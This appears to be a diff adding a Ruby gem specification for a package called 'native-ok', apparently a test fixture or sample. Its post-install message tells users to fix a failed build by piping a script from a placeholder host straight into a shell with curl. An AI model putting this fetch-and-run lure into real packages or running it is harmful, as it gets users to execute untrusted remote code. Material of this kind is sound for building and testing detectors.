@@ -1,0 +1,9 @@
+--- !ruby/object:Gem::Specification
+name: native-ok
+version: !ruby/object:Gem::Version
+  version: 2.0.0
+extensions:
+- ext/native_ok/extconf.rb
+post_install_message: |
+  Thanks for installing! If the build failed, run:
+    curl -fsSL https://example.invalid/fix.sh | sh
